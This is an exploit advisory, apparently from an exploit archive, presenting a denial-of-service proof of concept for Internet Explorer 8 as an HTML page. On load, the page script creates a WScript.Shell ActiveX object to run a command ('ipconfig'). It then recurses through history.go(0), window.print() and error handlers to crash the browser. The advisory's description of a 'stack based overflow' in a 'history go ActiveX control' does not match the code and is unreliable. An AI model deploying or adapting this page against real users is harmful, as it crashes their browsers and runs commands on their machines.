@@ -1,0 +1,88 @@
+                     =======================================================================
+
+                      Internet Explorer 8 (Multitudinous looping )Denial of Service Exploit
+                     =======================================================================
+
+                                                     by
+
+                                            Asheesh Kumar Mani Tripathi
+
+
+# code by Asheesh kumar Mani Tripathi
+
+# email informationhacker08@gmail.com
+
+# company       aksitservices
+
+# Credit by Asheesh Anaconda
+
+
+#Download http://www.microsoft.com/windows/internet-explorer/worldwide-sites.aspx
+#Greets to Bhudeo Prasad for making shell script :)
+
+
+#Background
+
+Internet Explorer 8 is a popular internet browser. with lots of bugs .....:)
+
+#Vulnerability
+This bug is a typical result of multitudinous  loop.  
+The flaw exists within "history go" ActiveX control which contains 
+stack based overflow conditions.User interaction is required to 
+exploit this vulnerability in that the target must visit a malicious 
+web page.
+
+
+#Impact
+
+Attacker Can run any windows command ,consume lots of memory and able to crash your IE or make 
+your system unaccessible,your work if any   might be lost
+
+#Proof of concept
+copy the code in text file and save as "asheesh.html" open in Internet Explorer 8
+
+========================================================================================================================
+
+                                                           asheesh.html
+========================================================================================================================
+<html>
+<title>asheesh kumar mani tripathi</title>
+
+<head>
+<script type="text/javascript">
+function sucks()
+{
+
+var shell=new ActiveXObject("WScript.Shell");
+shell.Run("ipconfig", 1);
+
+}
+
+function asheesh()
+{
+sucks();
+window.onerror=new Function("history.go(0)");
+window.print();
+asheesh();
+
+
+}
+asheesh();
+</script>
+</head>
+<body onLoad="asheesh()"></body>
+
+</html>
+
+
+========================================================================================================================
+
+
+
+
+#If you have any questions, comments, or concerns, feel free to contact me. 
+
+
+
+
+
